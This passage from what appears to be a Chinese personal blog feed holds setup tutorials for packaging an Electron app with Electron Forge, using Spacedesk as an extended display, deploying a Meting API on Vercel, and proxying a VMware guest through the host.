class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二选一</span></span><br><span class="line">npm install --save-dev electron</span><br><span class="line">yarn add --dev electron</span><br></pre></td></tr></table></figure><p>若您希望能够执行 Electron 如下所示，在您的<code>package.json</code>配置文件中的<code>scripts</code>字段下增加一条 start 命令：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后执行<code>start</code>命令能让您在开发模式下打开您的应用，效果等同于执行<code>electron .</code>。若将<code>start</code>更换为其他名称，则执行命令时也需一并更换。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br><span class="line">yarn start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">效果相同</span></span><br><span class="line">npm electron .</span><br><span class="line">yarn electron .</span><br></pre></td></tr></table></figure><p>之后可选择按照官网教程创建文件，也可以直接使用<code>electron-quick-start</code>，项目包含内容相同。</p><h4 id="直接使用-electron-quick-start">直接使用 electron-quick-start</h4><p>可以直接使用 <a href="https://github.com/electron/electron-quick-start" rel="external nofollow noreferrer">electron-quick-start</a> 作为模板，这是一个基于 Electron 文档中的快速入门指南的最小 Electron 应用程序，可以作为初级模板使用。</p><p>创建一个文件夹，名称随意，在该目录执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Clone this repository</span></span><br><span class="line">git clone https://github.com/electron/electron-quick-start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go into the repository</span></span><br><span class="line">cd electron-quick-start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Install dependencies</span></span><br><span class="line">npm install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Run the app</span></span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><p>若能够正常显示窗口与内容，则表明成功。</p><p>总结我们所做的所有步骤：</p><ul><li>我们启动了一个 Node.js 程序，并将 Electron 添加为依赖。</li><li>我们创建了一个 main.js 脚本来运行我们的主要进程，它控制我们的应用程序 并且在 Node.js 环境中运行。 在此脚本中， 我们使用 Electron 的 app 和 BrowserWindow 模块来创建一个浏览器窗口，在一个单独的进程（渲染器）中显示网页内容。</li><li>为了访问渲染器中的 Node.js 的某些功能，我们在 BrowserWindow 的构造函数上附加了一个预加载脚本。</li></ul><h3 id="打包应用程序">打包应用程序</h3><p>Electron Forge 是一个用于打包和分发 Electron 应用程序的工具。 它将 Electron 的构建工具生态系统统一到一个可扩展的界面中，这样每个人都可以直接上手制作 Electron 应用。这里我们将以此工具作为打包演示，后面配置均基于此打包工具。</p><p>将 Electron Forge 的 CLI 工具包安装到项目的 devDependencies 依赖中，然后使用现成的转化脚本将项目导入至 Electron Forge：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @electron-forge/cli</span><br><span class="line">yarn add --dev @electron-forge/cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面二选一，可使用 cnpm 代替 npm 执行</span></span><br><span class="line">npx electron-forge import</span><br></pre></td></tr></table></figure><p>在执行<code>npx electron-forge import</code>时可能会有报错，大多会卡在安装一个名为<code>electron-squirrel-startup</code>的包上。如果本地和依赖的 lockfile 版本对不上，命令中会给予提示，此外最大的原因便是网络问题了。</p><p>安装本体和 electron-forge 时可以通过第三方源解决速度与大部分报错问题，但下面这条却不行。由于是 npx 安装，cnpm 用不上，npm 国内源基本报错，npm 官方源等半小时都不一定安装完。</p><p>设置<code>npm electron</code>默认安装路径的环境变量能大概率解决 electron 安装缓慢或卡顿：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set ELECTRON_MIRROR http://npmmirror.com/mirrors/electron/</span><br></pre></td></tr></table></figure><p>之后再执行那条 npx 命令，问题得到解决。完成后，Forge 会将一些脚本添加到您的 package.json 文件中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-forge start&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;package&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-forge package&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;make&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-forge make&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>注意，此时若再执行 start 命令则不是<code>electron .</code>命令，可以另指定，例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="comment">//&quot;dev&quot;可换成其他自定义字段，不能与其他的重复</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>之后可使用<code>npm dev</code>在开发模式下打开项目，效果与<code>npm electron .</code>相同。</p><p>要创建可分发文件，请使用项目中的 make 脚本，该脚本最终运行了 electron-forge make 命令。项目名称不建议设置中文，否则有大概率 electron-forge make 执行成功却安装不了。运行完成后，会输出到项目目录的 out/make 目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run make</span><br><span class="line">yarn make</span><br></pre></td></tr></table></figure><p>使用 package 则同理，会输出到项目目录的 out 目录下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run package</span><br><span class="line">yarn package</span><br></pre></td></tr></table></figure><p>在执行时如何还提示缺少模块，例如<code>Cannot find module '@electron-forge/plugin-fuses'</code>这样的，则可以手动安装缺失的模块以解决，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @electron-forge/plugin-fuses</span><br></pre></td></tr></table></figure><p>之后重新运行项目中的 make 脚本（命令）。</p><p>打包时间可能会比较久，因项目本身大小、网络条件等情况而定。执行完成后在当前目录应有一个 out 文件夹，其中包括可分发文件与一个包含其源码的文件夹。</p><h3 id="软件信息的修改">软件信息的修改</h3><p>（实话说，这个地方我断断续续研究了一个多月，时间紧是一方面，不过还是试错占多数~）</p><p>（不过，此处任务栏显示图标却还是在前面那个<code>main.js</code>的那个位置设置的，可能是有所疏忽，这个文件中图标那里的路径不会生效。下面这段代码我仅作修改 Windows 系统下软件信息使用。）</p><p>打开<code>package.json</code>文件，与文件开头几个如<code>name</code>、<code>version</code>等参数同级缩进，添加<code>config</code>内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-quick-start-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="comment">//以上为示例内容，用于对照下方 config 的缩进等相对位置。复制粘贴时请删除注释内容，因为实际 json 中写这种注释会出现问题。</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;forge&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;packagerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;appVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;program-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;appCopyright&quot;</span><span class="punctuation">:</span> <span class="string">&quot;copyright-text&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/favicon.ico&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win32metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;ProductName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;program-win32&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CompanyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Company Co. Ltd.&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;FileDescription&quot;</span><span class="punctuation">:</span> <span class="string">&quot;description1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>请注意，打包时会自动忽略文件的后缀名，根据平台自动寻找相应的文件，例如 macOS 只支持<code>.icns</code>格式，Windows 只支持<code>.ico</code>格式，格式不匹配则不生效。因此不需要加后缀，因为 electron-forge 这个脚手架会帮你自动检测系统，自动帮你加上适合系统的 icon。</p><p>之后运行<code>npm run package</code>（确保<code>package.json</code>中<code>scripts</code>一段有配置<code>&quot;package&quot;: &quot;electron-forge package&quot;,</code>），若你在 Windows 平台下运行且顺利，则你可以在项目根目录中<code>out</code>文件夹中找到一个名为<code>program-name-win32-x64</code>的文件夹——这是你刚才打包的项目。这个文件夹中有一个名为<code>program-name.exe</code>的运行程序，将鼠标移动至该文件上面，会有一个悬浮窗，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件说明： description1</span><br><span class="line">公司： Company Co. Ltd.</span><br><span class="line">文件版本： 1.1.3.0</span><br><span class="line">创建日期： 【根据实际情况有所不同】</span><br><span class="line">大小： 【根据实际情况有所不同】</span><br></pre></td></tr></table></figure><p>右键该程序文件-&gt;<code>属性</code>-&gt;<code>详细信息</code>，大致内容如下：</p><table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>文件说明</td><td>description1</td></tr><tr><td>类型</td><td>应用程序</td></tr><tr><td>文件版本</td><td>1.1.3.0</td></tr><tr><td>产品名称</td><td>program-win32</td></tr><tr><td>产品版本</td><td>1.1.3</td></tr><tr><td>版权</td><td>copyright-text</td></tr><tr><td>大小</td><td>【根据实际情况有所不同】</td></tr><tr><td>修改日期</td><td>【根据实际情况有所不同】</td></tr><tr><td>语言</td><td>【根据实际情况有所不同】</td></tr><tr><td>原始文件名</td><td>program-name.exe</td></tr></tbody></table><p>双击运行该程序，在弹窗中左上角和任务栏图标均为前面“左上角图标”那一步中在<code>main.js</code>中设置的图标路径（理论上应与此步骤中<code>package.json</code>中设置相同，可能是有所疏忽导致问题）</p><h2 id="后记">后记</h2><p>参考：</p><blockquote><p><a href="https://www.electronjs.org/zh/docs/latest/tutorial/quick-start" rel="external nofollow noreferrer">https://www.electronjs.org/zh/docs/latest/tutorial/quick-start</a><br><a href="https://segmentfault.com/q/1010000008021979" rel="external nofollow noreferrer">https://segmentfault.com/q/1010000008021979</a><br><a href="https://blog.csdn.net/qq_49700358/article/details/126531158" rel="external nofollow noreferrer">https://blog.csdn.net/qq_49700358/article/details/126531158</a><br><a href="https://segmentfault.com/a/1190000022814176" rel="external nofollow noreferrer">https://segmentfault.com/a/1190000022814176</a><br><a href="https://zhuanlan.zhihu.com/p/648743608" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/648743608</a><br><a href="https://blog.csdn.net/BigFamer/article/details/109293202" rel="external nofollow noreferrer">https://blog.csdn.net/BigFamer/article/details/109293202</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Spacedesk 将手机或平板作为电脑扩展屏</title>
      <link href="/posts/2333218969/"/>
      <url>/posts/2333218969/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有时我需要使用电脑同时查看多个窗口，我会将其平铺在显示器中；窗口数一多，这就变得不太现实。我手头的设备不算少，我就想着能不能利用一下它们，给我的电脑扩展下屏幕。</p><p>虽说 Win10 自带一个投屏功能，但是对硬件和驱动有一定的要求（例如 Miracast 支持与否），而且延迟有点高，配置略微繁琐。其他有些软件，甚至还要把数据传到它的中转服务器再传回来，但我想这在内网中使用时应该不用这么麻烦。</p><p><strong>Spacedesk</strong></p><p>这是一款允许你将电脑屏幕扩展到其他设备上的软件。它可以让你使用手机、平板或其他显示设备作为电脑的第二块屏幕，从而扩大工作区域。它支持有线和无线两种连接方式，在内网中也能使用；有线连接的体验更佳，操作更流畅。</p><h3 id="软件安装与设置">软件安装与设置</h3><p>前往 <a href="https://www.spacedesk.net/#download" rel="external nofollow noreferrer">Spacedesk 官网下载页面</a>，由于其服务器在国外，国内访问体验不佳，可自备加速工具（也可以花点时间等待微软商店<s>的土豆服务器</s>加载完成后搜索安装）。加载完后找到<code>SPACEDESK DRIVER SOFTWARE for Windows PRIMARY PC (server)</code>，根据自己的设备选择合适的版本。这里下载的是受控端软件。</p><p>将下载后的<code>.msi</code>文件双击打开，然后一路 next，安装路径建议不要设置在 C 盘（C 盘容量不缺的请随意）（这里更改安装位置后貌似不会自动创建文件夹，需要手动创建），剩下的默认就行，继续一路 next，等待安装完成。</p><p>受控端则是在官网继续往下，在<code>SPACEDESK VIEWER SOFTWARE FOR SECONDARY MACHINE (CLIENT)</code>选择适合自己设备的版本下载安装（除了 Win、iOS 端可以在应用市场找到，剩下的基本要魔法才能解决）。为求方便，接下来如有涉及到控制端的，将使用 iOS 版本作为演示。</p><p>之后打开软件，按照提示进行操作即可（但英语要好）。需要确保相应设备在同一网络下，如果控制端设备能够识别到受控电脑在内网中的 IP 地址并显示，则表明配置成功，之后点击连接即可。若开启软件并打开连接开关后仍无法无线连接，可在受控端软件左侧点击<code>Communication Interfaces</code>，确保<code>Local Area Network</code>是打钩的。</p><p>如果使用 USB 连接，还需要在受控电脑的软件中找到左侧找到<code>USB Cable Drive</code>字样，将对应选项点击后打钩，然后可以使用 USB 连接设备投屏。</p><h3 id="使用体验">使用体验</h3><p>我之前用过 Rustdesk、向日葵之类的软件，Rustdesk 好像对多点触控不太友好；向日葵免费版一言难尽；雷电模拟器自带一个远程控制工具（它这个也能控制电脑屏幕，不必启动模拟器本体），免费版用着还挺流畅的，但好像只能复制屏幕，免费版也从它的服务器走，突然花屏也是不可避免的。</p><p>体验了下 Spacedesk，效果还不错（免费版有限制）。<code>Win</code>+<code>P</code>也可以设置<code>复制</code>以外的选项；在<code>设置</code>-&gt;<code>系统</code>-&gt;<code>显示</code>中也可以调整显示器的位置，调整起来和真正的显示器比较接近。手头很多旧设备又重新有了用武之地了。</p><p>延迟方面，和雷电模拟器的远程控制比较相近，可能是内网的缘故，相同画质的情况下 Spacedesk 显得更流畅一点。而且如果控制端设备有触摸功能的话，操作起来更接近原生触控的效果（无论是动画还是拖动与滑动，对于多点触控也能很好地驾驭。大概类似于……学校的希沃白板那样）。虽然雷电的也可以做到，但新版本的控制端软件中我实在没有找到演示教程中的某些区域，然后就用不上了。</p><p>PC 端安装这个软件后，它没有直接的关闭按钮，若想完全退出，需要在软件中将服务关闭（那个按钮或者滑块选到<code>OFF</code>），然后点击右上角的叉才算退出软件。在扩展设备连接后，任务栏中就会有一个连接窗口，不能隐藏到右下角，这是美中不足的地方。总的来说，这个软件还是不错的。</p>]]></content>
      
      
      <categories>
          
          <category> 体验推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Vercel 部署自己的 Meting 服务</title>
      <link href="/posts/1694841248/"/>
      <url>/posts/1694841248/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>之前想着给网站测个速，发现总有几个资源加载巨慢。后在排查时发现一个<code>api.i-meto.com</code>开头的资源加载很慢，又想起 Meting 官方 api 证书过期，便计划自己部署一个作为备用。</p><h3 id="你需要准备……">你需要准备……</h3><ul><li>GitHub 账户</li><li>Vercel 账户</li><li>一个好用的浏览器</li><li>一个尚可的加速器（例如 Watt Toolkit，用于加速 GitHub 访问）</li></ul><h3 id="Vercel-后端部署">Vercel 后端部署</h3><p>前往仓库 <a href="https://github.com/xizeyoupan/Meting-API" rel="external nofollow noreferrer">https://github.com/xizeyoupan/Meting-API</a>，找到<code>部署到 vercel</code>一节，点击部署按钮（也可以点击下面这个）：</p><p><a style="display: block;text-align: center;" href="https://vercel.com/import/project?template=https://github.com/xizeyoupan/Meting-API" target="_blank" rel="noopener noreferrer"><img src="https://vercel.com/button" alt="Vercel" tabindex="0"><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"></svg></span></a></p><p>这里的项目名称可任意写，不要和当前账户下其他项目仓库同名；如果非首次使用 GitHub，还需确保此处名称不与 GitHub 账户下其他项目同名。填写后点击该卡片右下角<code>Create</code>按钮，等待 Clone 与部署。完成后会展示<code>Congratulations!</code>页面并伴有满屏的烟花，此时表明部署成功。</p><p><img src="https://s2.loli.net/2024/07/22/5IamFbirYAuwBns.png" alt=""></p><h3 id="域名设置">域名设置</h3><p>由于<code>.vercel.app</code>域名在国内无法正常访问，故建议配置自定义域名。</p><p>来到 Vercel 账户首页，找到刚才部署的项目点进去，在顶部找到<code>Settings</code>选项卡，点击后在左侧找到<code>Domains</code>点击进入，即可添加域名。</p><p><img src="https://s2.loli.net/2024/07/22/QDpaTP31eKl8GUz.png" alt=""></p><p><img src="https://s2.loli.net/2024/07/22/cuqnksWHfpG3ibJ.png" alt=""></p><p>由于 DNS 服务商不同，我无法在此一一列出操作方法，请按照你使用的 DNS 服务商的说明进行操作。</p><p>在此再提醒一下：由于 Vercel 在国内的访问结果不佳，它很贴心地为大陆用户提供了专用解析地址：</p><table><thead><tr><th>类型</th><th>内容</th></tr></thead><tbody><tr><td>CNAME</td><td><a href="http://name-china.vercel-dns.com" rel="external nofollow noreferrer">name-china.vercel-dns.com</a></td></tr><tr><td>A</td><td>76.223.126.88</td></tr></tbody></table><p>两种解析方式二选一即可（如果使用像 Cloudflare 这样的服务商，记得设置成<code>仅 DNS</code>）。操作完等待 1-2 分钟，Vercel 会自动申请证书。完成后访问测试页面（假设你刚才绑定到 Vercel 项目的域名为<code>meting.example.com</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://meting.example.com/test</span><br></pre></td></tr></table></figure><p>如果显示的页面中有多个平台的解析演示，则表明部署成功；如果没有，则重新检查刚才的部署流程。</p><h3 id="使用">使用</h3><p>使用方法同原版 MetingJS，只需更改 api 地址即可。例如，官方 api 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.i-meto.com/meting/api?server=:server&amp;type=:type&amp;id=:id&amp;r=:r</span><br></pre></td></tr></table></figure><p>那么只需将这段字符替换为下面这段即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://meting.example.com/api?server=:server&amp;type=:type&amp;id=:id&amp;r=:r</span><br></pre></td></tr></table></figure><p>如果是前端引入 metingjs，可以将 metingjs 保存到本地，按照上面这个方式替换 api 地址后引入该本地文件，或者使用以下代码更换 api 地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> meting_api=<span class="string">&#x27;https://meting.example.com/api?server=:server&amp;type=:type&amp;id=:id&amp;auth=:auth&amp;r=:r&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VMware 通过宿主机代理连接网络</title>
      <link href="/posts/3161555917/"/>
      <url>/posts/3161555917/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为测试和学习研究的需要，我使用了 VMware 软件创建与使用虚拟机。</p><p>上回安装完 Ubuntu 之后一直苦于代理工具配置不好，忽然想起可以让虚拟机通过本机代理上网……</p><p>现在部分开发学习环境可以放心挪到虚拟机里了。</p><blockquote><p>本文所介绍仅供技术学习使用，不得利用本文内容进行违反法律、道德的行为，否则后果自负</p></blockquote><h2 id="准备工作">准备工作</h2><p>本文写作时的配置环境为：</p><ul><li>物理机 Windows 系统</li><li>VMware Workstation</li><li>V2-RayN（安装在物理机系统上）</li></ul><p>为行文方便，本文可能使用到的例子如下：</p><ul><li>虚拟网络名称 -&gt; <code>VMnet8</code></li><li>虚拟网络中主机的地址 -&gt; <code>192.168.200.1</code></li></ul><p><strong>请先确保你即将使用的代理工具能够正常使用，例如正常访问 Google 搜索，否则建议先解决代理工具的问题。</strong></p><h2 id="知识铺垫">知识铺垫</h2><p>NAT 网络地址转换（Network Address Translation，简称 NAT）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT 实际上是为解决 IPv4 地址短缺而开发的技术，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。</p><p>NAT 的实现方式有三种，即静态转换（Static Nat）、动态转换（Dynamic Nat）和端口多路复用（OverLoad）。</p><p>不过在这里，你只需要把它当做一个虚拟的特殊的路由器看待即可。VMware 虚拟网络功能可以虚拟出这样一个“路由器”，只需要让主机和虚拟机均连接至这个“路由器”，便可以进行通信。后文中若无其他说明，则提到的“路由器”均指这里的“虚拟网络”。</p><h2 id="创建虚拟网络">创建虚拟网络</h2><p>此步骤没有必须修改之处，除非你不希望使用默认创建的虚拟网络。</p><p>VMware 默认会创建一个 NAT 类型虚拟网，如果没有或不确定其存在和名称，可进入 VMware 主界面，从上方菜单栏进入<code>编辑</code>-&gt;<code>虚拟网络编辑器</code>进行查看。通常情况下它会默认创建一个名为<code>VMnet8</code>的虚拟网，为方便起见，我们接下来便直接使用这个名为<code>VMnet8</code>的网。如果不是，则需要根据你的实际情况修改。</p><p>如果虚拟机的 NAT 模式出现问题，比如网卡不分配 IP、NAT 模式下无法上网，多半是 VMware 服务有问题，需要保证 VMware DHCP Service 和 VMware NAT Service 服务是正常运行的。如果不确定，可通过物理机<code>Win+R</code>-&gt;<code>services.msc</code>进入<code>服务</code>查看。</p><h2 id="连接">连接</h2><p>还是上一步那个<code>虚拟网络编辑器</code>窗口，选中你准备连接的那个虚拟网络（例如本文中默认创建的<code>VMnet8</code>），将下方<code>将主机虚拟适配器连接到此网络</code>保持勾选状态，主机便已经连上该虚拟网络（即虚拟的“路由器”）。</p><p>之后选择你准备连接该“路由器”的虚拟机，点击<code>编辑虚拟机设置</code>，或右键左侧虚拟机列表中的虚拟机选择<code>编辑</code>，或点击上方菜单中<code>虚拟机</code>-&gt;<code>设置</code>，在弹出窗口中点击<code>网络适配器</code>，将<code>网络连接</code>一栏中选择<code>自定义</code>，选项框中选择前面你设置的那个网络（如果按照本文流程应为<code>VMnet8（NAT 模式）</code>。至此该虚拟机连上该“路由器”。</p><p><img src="https://s2.loli.net/2024/03/21/7X1rs3lPKNzBaqZ.png" alt=""></p><h2 id="本机代理">本机代理</h2><p>打开主机的任务管理器，进入<code>性能</code>选项卡，找到前面你准备的网络（例如<code>VMnet8</code>，这里可能显示为<code>以太网 VMware Network Adapter VMnet8</code>），点击后在下方找到其<code>IPv4 地址</code>并记录（例如，<code>192.168.200.1</code>，这里需要根据自己实际情况进行调整，这是主机在这个“路由器”下的地址（其实在前面<code>虚拟网络编辑器</code>窗口中就已经能直接看到这个地址了，不过无妨）。</p><p><img src="https://s2.loli.net/2024/03/21/1aJIdiyZlDC8new.png" alt=""></p><p>然后打开主机上的代理工具，这里以 V2RayN 为例。点击上方菜单栏<code>设置</code>-&gt;<code>参数设置</code>-&gt;<code>Core: 基础设置</code>，将<code>允许来自局域网的连接</code>开关打开，点击下方的确定。该软件默认端口如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks:10808</span><br><span class="line">http:10809</span><br></pre></td></tr></table></figure><p>请记下这里的端口号。如果在刚才设置界面对端口有更改则需根据你的情况更换端口（V2RayN 软件主界面下方可以找到这个端口）。</p><p><img src="https://s2.loli.net/2024/03/21/sfYIDaCQtBpJH1k.png" alt=""></p><p>如果你使用的是其他代理软件，则需同样将其对应实现局域网连接的功能启用。</p><h2 id="虚拟机代理">虚拟机代理</h2><p>先在主机代理软件中配置一个速度尚可、尽量稳定的连接线路，在本机测试访问 Google、GitHub 等在国内通常情况下难以顺利访问的网站，若能够正常访问，则不必再切换线路，而是进行接下来的操作。</p><h3 id="Windows10">Windows10</h3><p>进入 Windows 虚拟机的<code>设置</code>-&gt;<code>网络和 Internet</code>-&gt;<code>代理</code>，下拉找到<code>手动设置代理</code>，将<code>使用代理服务器</code>打开，在前面填入虚拟网络的 IPv4 地址（前面在任务管理器查看的那个地址，例如本文举例的<code>192.168.200.1</code>），后面填入 HTTP 代理端口（例如 V2-Ray 默认的<code>10809</code>，这里不填 SOCKS5 端口）。</p><p>然后在虚拟机里测试访问国外网站，若主机代理软件日志中出现虚拟机中网站访问记录，且能正常加载网站，则表明配置生效。</p><p>如果代理后无法上网，可以在命令提示符中<code>ipconfig</code>一下，确认当前连接的 IP 地址。</p><h3 